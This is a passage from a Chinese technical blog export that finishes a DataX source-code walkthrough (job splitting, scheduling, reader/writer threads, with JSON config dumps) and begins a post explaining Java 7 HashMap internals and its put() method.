class="line">        &#125;,</span><br><span class="line">        &quot;statistics&quot;:&#123;</span><br><span class="line">            &quot;collector&quot;:&#123;</span><br><span class="line">                &quot;plugin&quot;:&#123;</span><br><span class="line">                    &quot;maxDirtyNumber&quot;:10,</span><br><span class="line">                    &quot;taskClass&quot;:&quot;com.alibaba.datax.core.statistics.plugin.task.StdoutPluginCollector&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;transport&quot;:&#123;</span><br><span class="line">            &quot;channel&quot;:&#123;</span><br><span class="line">                &quot;byteCapacity&quot;:67108864,</span><br><span class="line">                &quot;capacity&quot;:512,</span><br><span class="line">                &quot;class&quot;:&quot;com.alibaba.datax.core.transport.channel.memory.MemoryChannel&quot;,</span><br><span class="line">                &quot;flowControlInterval&quot;:20,</span><br><span class="line">                &quot;speed&quot;:&#123;</span><br><span class="line">                    &quot;byte&quot;:-1,</span><br><span class="line">                    &quot;record&quot;:-1</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;exchanger&quot;:&#123;</span><br><span class="line">                &quot;bufferSize&quot;:32,</span><br><span class="line">                &quot;class&quot;:&quot;com.alibaba.datax.core.plugin.BufferedRecordExchanger&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;entry&quot;:&#123;</span><br><span class="line">        &quot;jvm&quot;:&quot;-Xms1G -Xmx1G&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;job&quot;:Object&#123;...&#125;,</span><br><span class="line">    &quot;plugin&quot;:&#123;</span><br><span class="line">        &quot;reader&quot;:&#123;</span><br><span class="line">            &quot;mysqlreader&quot;:&#123;</span><br><span class="line">                &quot;class&quot;:&quot;com.alibaba.datax.plugin.reader.mysqlreader.MysqlReader&quot;,</span><br><span class="line">                &quot;description&quot;:&quot;useScene: prod. mechanism: Jdbc connection using the database, execute select sql, retrieve data from the ResultSet. warn: The more you know about the database, the less problems you encounter.&quot;,</span><br><span class="line">                &quot;developer&quot;:&quot;alibaba&quot;,</span><br><span class="line">                &quot;name&quot;:&quot;mysqlreader&quot;,</span><br><span class="line">                &quot;path&quot;:&quot;/Users/dengmingrui/temp/DataX/target/datax/datax/plugin/reader/mysqlreader&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;writer&quot;:&#123;</span><br><span class="line">            &quot;txtfilewriter&quot;:&#123;</span><br><span class="line">                &quot;class&quot;:&quot;com.alibaba.datax.plugin.writer.txtfilewriter.TxtFileWriter&quot;,</span><br><span class="line">                &quot;description&quot;:&quot;useScene: test. mechanism: use datax framework to transport data to txt file. warn: The more you know about the data, the less problems you encounter.&quot;,</span><br><span class="line">                &quot;developer&quot;:&quot;alibaba&quot;,</span><br><span class="line">                &quot;name&quot;:&quot;txtfilewriter&quot;,</span><br><span class="line">                &quot;path&quot;:&quot;/Users/dengmingrui/temp/DataX/target/datax/datax/plugin/writer/txtfilewriter&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们原来配置的json内容只是整个json的job部分，其他内容都是由 ColumnCast.bind(allConf)方法补充的。后面调用了<br>下面的方法(伪代码)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AbstractContainer  container = new JobContainer(allConf);</span><br><span class="line">container.start();</span><br></pre></td></tr></table></figure>

<p><strong>JobContainer start()方法</strong></p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/7.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 10 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>可以看到datax调用方法顺序如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 前置处理</span><br><span class="line"> this.preHandle();</span><br><span class="line"> // 初始化</span><br><span class="line"> this.init();</span><br><span class="line"> // 准备方法</span><br><span class="line"> this.prepare();</span><br><span class="line"> // 任务切分</span><br><span class="line"> this.split();</span><br><span class="line"> // 执行调度</span><br><span class="line"> this.schedule();</span><br><span class="line"> // ...</span><br><span class="line"> this.post();</span><br><span class="line"> // ...</span><br><span class="line"> this.postHandle();</span><br><span class="line"> this.invokeHooks();</span><br></pre></td></tr></table></figure>

<p>其中核心的方法为 this.init() 、this.split()、 this.schedule() 本次重点只看这几个方法<br><strong>init()方法</strong>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/8.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 11 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br><strong>initJobReader</strong>方法\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/9.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 12 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>通过方法将mysql插件的类家在到jvm中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadUtil.loadJobPlugin(PluginType.READER,this.readerPluginName)</span><br></pre></td></tr></table></figure>

<p>提取Configuration 对象参数的部分插入到 jobReader 的pluginJobConf 属性中,具体内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// pluginJobConf</span><br><span class="line">&#123;</span><br><span class="line">    &quot;column&quot;:[</span><br><span class="line">        &quot;id&quot;,</span><br><span class="line">        &quot;project_id&quot;,</span><br><span class="line">        &quot;alarm_time&quot;,</span><br><span class="line">        &quot;job_id&quot;,</span><br><span class="line">        &quot;job_name&quot;,</span><br><span class="line">        &quot;receiver&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;connection&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;jdbcUrl&quot;:[</span><br><span class="line">                &quot;xxxx&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;table&quot;:[</span><br><span class="line">                &quot;xxxxx&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;password&quot;:&quot;xxxxx&quot;,</span><br><span class="line">    &quot;splitPk&quot;:&quot;id&quot;,</span><br><span class="line">    &quot;username&quot;:&quot;xxxx&quot;</span><br><span class="line">&#125;</span><br><span class="line">// peerPluginJobConf</span><br><span class="line">&#123;</span><br><span class="line">    &quot;dateFormat&quot;:&quot;yyyy-MM-dd&quot;,</span><br><span class="line">    &quot;fieldDelimiter&quot;:&quot;,&quot;,</span><br><span class="line">    &quot;fileName&quot;:&quot;test&quot;,</span><br><span class="line">    &quot;path&quot;:&quot;/Users/dengmingrui/temp/data&quot;,</span><br><span class="line">    &quot;writeMode&quot;:&quot;truncate&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终执行jobReader.init(); mysql插件的init方法进行初始化。<br>initJobWriter()逻辑类似这里就不查看了<br><strong>split()方法</strong><br>split方法是reader和writer最细粒度的切分,writer的切分结果要参照reader的切分结果达到切分后数目相等，才能满足1：1的通道模型\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/10.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 13 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>split 方法分为3部分</p>
<ol>
<li>拆分reader</li>
<li>根据reader的拆分结果拆分writer</li>
<li>将reader 和 writer的拆分结果 合并到Configuration对象中<br>具体的拆分情况，感兴趣的同学可以看一下对应插件的源码<br>下面是我当前任务拆分后,我之前配置的json内容变成什么样子了。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;common&quot;:Object&#123;...&#125;,</span><br><span class="line">    &quot;core&quot;:&#123;</span><br><span class="line">        &quot;container&quot;:&#123;</span><br><span class="line">            &quot;job&quot;:Object&#123;...&#125;,</span><br><span class="line">            &quot;taskGroup&quot;:&#123;</span><br><span class="line">                &quot;channel&quot;:5</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;trace&quot;:Object&#123;...&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;dataXServer&quot;:Object&#123;...&#125;,</span><br><span class="line">        &quot;statistics&quot;:&#123;</span><br><span class="line">            &quot;collector&quot;:Object&#123;...&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;transport&quot;:Object&#123;...&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;entry&quot;:&#123;</span><br><span class="line">        &quot;jvm&quot;:&quot;-Xms1G -Xmx1G&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;job&quot;:&#123;</span><br><span class="line">        &quot;content&quot;:[</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;reader&quot;:&#123;</span><br><span class="line">                    &quot;name&quot;:&quot;mysqlreader&quot;,</span><br><span class="line">                    &quot;parameter&quot;:&#123;</span><br><span class="line">                        &quot;column&quot;:&quot;id,xx,xx,job_id,xxx,xxx&quot;,</span><br><span class="line">                        &quot;columnList&quot;:[</span><br><span class="line">                            &quot;xxx&quot;,</span><br><span class="line">                            &quot;xxx&quot;,</span><br><span class="line">                            &quot;xxx&quot;,</span><br><span class="line">                            &quot;xxx&quot;,</span><br><span class="line">                            &quot;xxxx&quot;,</span><br><span class="line">                            &quot;xxxx&quot;</span><br><span class="line">                        ],</span><br><span class="line">                        &quot;fetchSize&quot;:-2147483648,</span><br><span class="line">                        &quot;isTableMode&quot;:true,</span><br><span class="line">                        &quot;jdbcUrl&quot;:&quot;jxxxxxx&quot;,</span><br><span class="line">                        &quot;loadBalanceResourceMark&quot;:&quot;xxxx&quot;,</span><br><span class="line">                        &quot;password&quot;:&quot;xxxxxx&quot;,</span><br><span class="line">                        &quot;pkType&quot;:&quot;pkTypeLong&quot;,</span><br><span class="line">                        &quot;querySql&quot;:&quot;select xxx,xxxx,xxxx,xxxx,xxxx,xxxx from xxxx  where  (2977 &lt;= id AND id &lt; 3473) &quot;,</span><br><span class="line">                        &quot;splitPk&quot;:&quot;id&quot;,</span><br><span class="line">                        &quot;table&quot;:&quot;xxxx&quot;,</span><br><span class="line">                        &quot;tableNumber&quot;:1,</span><br><span class="line">                        &quot;username&quot;:&quot;xxxx&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;taskId&quot;:6,</span><br><span class="line">                &quot;writer&quot;:&#123;</span><br><span class="line">                    &quot;name&quot;:&quot;txtfilewriter&quot;,</span><br><span class="line">                    &quot;parameter&quot;:&#123;</span><br><span class="line">                        &quot;dateFormat&quot;:&quot;yyyy-MM-dd&quot;,</span><br><span class="line">                        &quot;encoding&quot;:&quot;UTF-8&quot;,</span><br><span class="line">                        &quot;fieldDelimiter&quot;:&quot;,&quot;,</span><br><span class="line">                        &quot;fileName&quot;:&quot;test__ad112b06_6dd1_4708_a608_890fbf55f7b1&quot;,</span><br><span class="line">                        &quot;path&quot;:&quot;/Users/dengmingrui/temp/data&quot;,</span><br><span class="line">                        &quot;writeMode&quot;:&quot;truncate&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;,</span><br><span class="line">            Object&#123;...&#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;setting&quot;:&#123;</span><br><span class="line">            &quot;speed&quot;:&#123;</span><br><span class="line">                &quot;channel&quot;:5</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;plugin&quot;:Object&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到job.content数组下面多了很多小job,这里每个小job就是我们一开始说的task,每一个task 都有对应reader和writer的数据源信息。datax这里把json完的很6<br><strong>schedule()方法</strong><br>  一开始我们说过了schedule 是把拆分的结果合并到一个taskgroup中,最终执行\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/11.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 14 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>最终调用startAllTaskGroup()发放执行taskgroup的任务\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/12.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 15 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/13.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 16 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>最终线程执行的方法在TaskGroupContainer累的run()方法中,这里逻辑太长了就不截图了\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/14.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 17 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>datax 将任务最终放入到队列中，后面有一个死循环一直从队列中获取任务最终调用 taskExecutor.doStart();方法执行到真正单个task执行的逻辑\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/15.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 18 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><strong>doStart() 方法</strong><br>先开启写线程，再开启读线程</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/16.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 19 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>readerThread 和 writerThread 是什么时候初始化的呢？<br>答：是在 new TaskExecutor()的时候, 最终读取的还是json中的plugin配置\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/17.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 20 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>最终执行的run方法是在ReaderRunner和WriterRunner这2个类对应的run()方法\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/18.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 21 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h5 id="reader-和-writer-之间是如何通信的呢？"><a href="#reader-和-writer-之间是如何通信的呢？" class="headerlink" title="reader 和 writer 之间是如何通信的呢？"></a>reader 和 writer 之间是如何通信的呢？</h5><p>答： Record 对象，reader 插件在读取之后，将对应的数据封装到Record对象,存储在集合中,writer 读取对应的集合数据在执行写入到目标数据源。下面是mysql插件的逻辑\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/19.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 22 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>最终写入的方法在BufferedRecordExchanger类的sendToWriter方法\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/20.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 23 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>读取的场景在WriterRunner类的run()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">taskWriter.startWrite(recordReceiver);</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/temp/datax/21.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 24 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>到这里我们就把task 读写场景的核心逻辑看完了</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>  本次查看了datax的源码,对datax有了更生层次的理解,datax的插件架构还是学习到了，并且整个任务全程用json对应的Configuration类贯穿整个链路非常使得代码非常灵活。datax对任务的拆分设计和精准的速度控制逻辑的设计后面也有借鉴的地方，类加载器的使用非常巧，代码整体上还是写的非常易懂的看起来并不吃力。其实datax的架构和执行逻辑文档上写的还是很清楚的，如果感兴趣的话可以快速看一下源码的。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>源码</tag>
        <tag>datax</tag>
        <tag>数据同步</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>集合类框架 hashmap 源码详解</title>
    <url>//2020/09/22/%20java%E3%80%90%E9%9B%86%E5%90%88%E7%B1%BB%E6%A1%86%E6%9E%B6%E3%80%91%20hashmap%20%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>HashMap 可能是面试的时候必问的题目了，面试官为什么都偏爱拿这个问应聘者？因为 HashMap 它的设计结构和原理比较有意思，它既可以考初学者对 Java 集合的了解又可以深度的发现应聘者的数据结构功底。</p>
<h3 id="Java-7-中-HashMap"><a href="#Java-7-中-HashMap" class="headerlink" title="Java 7 中 HashMap"></a>Java 7 中 HashMap</h3><p>HashMap 是最简单的，一来我们非常熟悉，二来就是它不支持并发操作，所以源码也非常简单。d</p>
<p>首先，我们用下面这张图来介绍 HashMap 的结构。</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586585802287.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>大方向上，HashMap 里面是一个数组，然后数组中每个元素是一个单向链表。为什么是这种的结构，这涉及到数据结构方面的知识了。</p>
<h3 id="HashMap的数据结构"><a href="#HashMap的数据结构" class="headerlink" title="HashMap的数据结构"></a>HashMap的数据结构</h3><p>数据结构中有数组和链表来实现对数据的存储，但这两者基本上是两个极端。</p>
<ul>
<li><p>数组<br>数组存储区间是连续的，占用内存严重，故空间复杂的很大。但数组的二分查找时间复杂度小，为O(1)；<br>数组的特点是：寻址容易，插入和删除困难；</p>
</li>
<li><p>链表<br>链表存储区间离散，占用内存比较宽松，故空间复杂度很小，但时间复杂度很大，为O(N)。<br>链表的特点是：寻址困难，插入和删除容易。</p>
</li>
<li><p>哈希表<br>那么我们能不能综合两者的特性，做出一种寻址容易，插入删除也容易的数据结构？答案是肯定的，这就是我们要提起的哈希表。哈希表（(Hash table）既满足了数据的查找方便，同时不占用太多的内容空间，使用也十分方便。</p>
</li>
</ul>
<p>哈希表有多种不同的实现方法，我接下来解释的是最常用的一种方法—— 拉链法，我们可以理解为“链表的数组”，如图：\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586585882830.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>从上图我们可以发现哈希表是由数组+链表组成的，一个长度为16的数组中，每个数组中元素存储的是一个链表的头结点。</p>
<p>那么这些元素是按照什么样的规则存储到数组中呢。一般情况我们首先想到的就是元素的 key 的哈希值对数组长度取模得到 ( hash(key)%(length -1) )，这样一来，元素的分布相对来说是比较均匀的。但是，“模”运算的消耗还是比较大的，能不能找一种更快速，消耗更小的方式那？java中是这样做的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int indexFor(int h, int length) &#123;</span><br><span class="line">   return h &amp; (length-1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道每个数据对象的hash对应唯一一个值，但是一个hash值不一定对应唯一的数据对象。如果两个不同对象的 hashCode 相同，此情况即称为哈希冲突。<br>比如上述HashMap中，12%16&#x3D;12，28%16&#x3D;12，108%16&#x3D;12，140%16&#x3D;12。所以12、28、108以及140都存储在数组下标为12的位置，然后依次放在数组中该位置的链表上。</p>
<p>注意：<br>对于那些 hash 冲突的数据，最新(最后) Put 的值放在链表的头部，为什么这样做呢？因为我们程序设计中认为最新放进去的值它的使用率会更高些，放在链表头比较容易查询获取到。</p>
<p>HashMap 里面实现一个静态内部类 Entry，Entry 包含四个属性：key，value，hash值和用于单向链表的 next。从属性key，value我们就能很明显的看出来 Entry 就是 HashMap 键值对实现的一个基础 bean，我们上面说到 HashMap的基础就是一个线性数组，这个数组就是 Entry[]，Map 里面的内容都保存在 Entry[] 里面。上图中，每个绿色的实体是嵌套类 Entry 的实例。</p>
<p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。<br>loadFactor：负载因子，默认为0.75。<br>threshold：扩容的阈值，等于 capacity * loadFactor。<br>注意问题：</p>
<h4 id="1、扩容的数组的长度为什么保持-2-n？"><a href="#1、扩容的数组的长度为什么保持-2-n？" class="headerlink" title="1、扩容的数组的长度为什么保持 2^n？"></a>1、扩容的数组的长度为什么保持 2^n？</h4><p>其实这是为了保证通过hash方式获取下标的时候分布均匀。数组长度为2的n次幂的时候，不同的key 算得得 index 相同的几率较小，那么数据在数组上分布就比较均匀，也就是说碰撞的几率小，相对的，查询的时候就不用遍历某个位置上的链表，这样查询效率也就较高了。</p>
<h4 id="2、为什么负载因子的值默认为-0-75？"><a href="#2、为什么负载因子的值默认为-0-75？" class="headerlink" title="2、为什么负载因子的值默认为 0.75？"></a>2、为什么负载因子的值默认为 0.75？</h4><p>加载因子是表示Hash表中元素的填满的程度。</p>
<p>加载因子越大，填满的元素越多，空间利用率越高，但冲突的机会加大了。<br>反之,加载因子越小，填满的元素越少，冲突的机会减小，但空间浪费多了。<br>冲突的机会越大，则查找的成本越高。反之，查找的成本越小。</p>
<p>因此,必须在 “冲突的机会”与”空间利用率”之间寻找一种平衡与折衷。</p>
<h3 id="put-过程分析"><a href="#put-过程分析" class="headerlink" title="put 过程分析"></a>put 过程分析</h3><p>还是比较简单的，跟着代码走一遍吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    // 当插入第一个元素的时候，需要先初始化数组大小</span><br><span class="line">    if (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    // 如果 key 为 null，感兴趣的可以往里看，最终会将这个 entry 放到 table[0] 中</span><br><span class="line">    if (key == null)</span><br><span class="line">        return putForNullKey(value);</span><br><span class="line">    // 1. 求 key 的 hash 值</span><br><span class="line">    int hash = hash(key);</span><br><span class="line">    // 2. 找到对应的数组下标</span><br><span class="line">    int i = indexFor(hash, table.length);</span><br><span class="line">    // 3. 遍历一下对应下标处的链表，看是否有重复的 key 已经存在，</span><br><span class="line">    //    如果有，直接覆盖，put 方法返回旧值就结束了</span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(this);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    // 4. 不存在重复的 key，将此 entry 添加到链表中，细节后面说</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组初始化（inflateTable）"><a href="#数组初始化（inflateTable）" class="headerlink" title="数组初始化（inflateTable）"></a>数组初始化（inflateTable）</h4><p>在第一个元素插入 HashMap 的时候做一次数组的初始化，就是先确定初始的数组大小，并计算数组扩容的阈值。</p>
